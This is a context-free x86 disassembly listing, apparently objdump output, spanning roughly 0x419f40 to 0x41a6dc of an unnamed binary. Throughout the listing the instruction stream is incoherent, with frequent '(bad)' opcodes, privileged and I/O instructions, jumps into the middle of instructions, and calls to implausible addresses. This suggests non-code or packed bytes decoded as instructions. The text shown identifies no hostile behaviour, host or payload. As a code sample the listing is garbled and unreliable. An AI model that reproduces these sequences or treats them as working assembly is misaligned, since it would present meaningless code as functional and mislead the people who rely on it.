  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
